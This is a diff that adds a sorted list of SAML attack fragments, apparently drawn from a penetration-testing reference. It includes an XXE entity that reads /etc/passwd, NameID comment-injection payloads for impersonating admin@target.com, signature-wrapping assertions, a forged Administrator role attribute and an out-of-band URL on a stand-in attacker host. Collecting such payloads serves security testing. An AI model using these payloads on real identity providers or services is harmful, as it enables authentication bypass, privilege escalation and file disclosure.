@@ -1,0 +1,35 @@
+/api/me
+/api/saml/bootstrap
+/saml/acs
+/var/log/
+<!---->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+</saml:Assertion>
+</saml:AttributeStatement>
+</samlp:Response>
+<?xml version="1.0"?>
+<Assertion>
+<Extensions>
+<NameID>admin@target.com<!---->@attacker.com</NameID>
+<Response>
+<SubjectConfirmationData>
+<ds:KeyInfo>
+<ds:Signature>
+<ds:Signature>...covers ID=legit-original...</ds:Signature>
+<ds:X509Certificate>
+<saml:Assertion ID="evil">
+<saml:Assertion ID="legit-original">
+<saml:Assertion>
+<saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
+<saml:AttributeStatement>
+<saml:EncryptedAssertion>
+<saml:Issuer>
+<saml:NameID>admin@target.com<!---->@attacker.com</saml:NameID>
+<saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
+<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
+<saml:Subject><saml:NameID>you@target.com</saml:NameID></saml:Subject>
+<samlp:Response>
+Conditions/NotOnOrAfter
+base64 -d <<< "$SAML" | xmllint --format - > saml.xml
+cat saml.xml | base64 -w0
+http://collaborator.attacker.com/x
